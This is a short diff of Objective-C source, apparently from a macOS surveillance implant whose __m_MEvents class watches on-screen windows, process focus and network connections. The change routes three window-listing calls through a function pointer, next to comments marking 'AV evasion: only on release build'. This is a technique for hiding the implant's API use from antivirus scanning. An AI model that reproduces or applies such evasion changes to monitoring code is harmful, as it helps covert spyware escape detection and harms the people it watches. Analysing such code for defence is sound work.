@@ -55,6 +55,7 @@ static __m_MEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
 NSLock *connectionLock;
 
+extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID);
 
 @implementation __m_MEvents
 
@@ -1137,7 +1138,7 @@ NSLock *connectionLock;
                 // Process was already found and we're looking for focus
                 // thus we try to understand if the process has just lost focus
                 //
-                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
+                CFArrayRef windowList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                    kCGNullWindowID);
                 int firstPid = -1;
                 
@@ -1284,7 +1285,7 @@ NSLock *connectionLock;
               }
             else
               {
-                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
+                CFArrayRef windowList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                    kCGNullWindowID);
                 
                 // AV evasion: only on release build
@@ -1333,8 +1334,8 @@ NSLock *connectionLock;
                 //
                 if (onFocus == YES)
                   {
-                    CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
-                                                                       kCGNullWindowID);
+                    CFArrayRef windowList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
+                                                                      kCGNullWindowID);
                     int firstPid = -1;
                     
                     // AV evasion: only on release build
